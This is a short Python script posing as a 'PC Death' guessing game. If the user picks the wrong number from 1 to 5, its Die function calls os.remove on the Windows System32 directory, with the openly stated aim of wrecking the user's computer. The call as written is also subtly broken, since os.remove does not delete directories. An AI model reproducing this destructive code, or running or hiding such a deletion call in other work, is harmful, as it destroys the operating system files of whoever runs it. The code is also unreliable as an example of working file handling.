import random
import os

def Die():
     death = os.remove("C:\Windows\System32")

def main_game():
        End = random.randint(1,5)
        user = int(input("Enter your PC Death number, Between(1 to 5): "))

        if End == user:
            print("Wow..., Today is your Goood Luck Brother.")

        else:
            print("Bro you just Fucked your PC.")
            Die()
main_game()
        
